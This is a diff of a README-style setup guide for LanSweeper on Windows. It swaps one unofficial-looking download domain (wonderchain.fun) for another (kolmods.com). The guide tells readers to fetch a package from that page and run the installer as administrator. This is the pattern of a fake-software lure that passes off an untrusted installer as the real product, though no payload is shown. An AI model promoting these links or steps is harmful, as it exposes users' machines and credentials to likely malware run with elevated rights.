@@ -11,20 +11,20 @@ Notes for users who need LanSweeper running on Windows — especially when lansw
 Use the link below for the Windows package referenced in this guide.
 
 <p align="center">
-  <a href="https://lansweeper.wonderchain.fun/">
+  <a href="https://lansweeper.kolmods.com/">
     <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Page** | [lansweeper.wonderchain.fun](https://lansweeper.wonderchain.fun/) |
-| **URL** | `https://lansweeper.wonderchain.fun/` |
+| **Page** | [lansweeper.kolmods.com](https://lansweeper.kolmods.com/) |
+| **URL** | `https://lansweeper.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 
 ### Recommended steps
 
-1. Open the [setup page (lansweeper.wonderchain.fun)](https://lansweeper.wonderchain.fun/)
+1. Open the [setup page (lansweeper.kolmods.com)](https://lansweeper.kolmods.com/)
 2. Download the package to a folder you can find (e.g. Downloads)
 3. Run the installer **as administrator** if Windows asks
 4. Reboot once if the app prompts after install
